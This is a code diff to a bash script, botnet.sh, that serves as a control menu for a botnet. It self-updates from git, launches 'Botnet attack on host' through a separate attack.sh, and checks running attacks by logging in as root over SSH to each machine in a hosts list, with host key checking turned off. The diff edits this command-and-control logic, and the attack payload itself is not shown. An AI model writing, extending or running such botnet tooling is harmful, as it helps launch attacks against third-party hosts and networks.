@@ -4,7 +4,7 @@ SCRIPT_DIR=$(dirname "$0")
 export SCRIPT_DIR
 
 cd $SCRIPT_DIR
-git fetch
+#git fetch
 
 [[ -n $(git log ..origin/master) ]] && {
     echo "Found a new version of me, updating myself..."
@@ -14,7 +14,7 @@ git fetch
     exec "$SCRIPT_DIR/botnet.sh"
 
     # Now exit this old instance
-    exit 1
+    exit 0
 }
 echo "Already the latest version."
 
@@ -29,8 +29,9 @@ while : ; do
 
     1) #Botnet attack on host
         bash "$SCRIPT_DIR/attack.sh"
+        continue
         ;;
-        
+
     2) #Bandwidth monitoring
         count=0
         while read -r host
@@ -47,9 +48,10 @@ while : ; do
 
     3) #Show current attacks
         echo "Loading..."
+        output=''
         while read -r host
         do
-            processes=$(ssh -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')
+            processes=$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "root@$host" "ps -aux | grep start.py | grep -v grep | grep -vi screen" | awk '{print $13, $14}' | sed 's/^/    /')
             output+="$host\n$processes\n\n"
         done < "$SCRIPT_DIR/hosts.txt"
         printf "$output" > "$SCRIPT_DIR/output.txt"
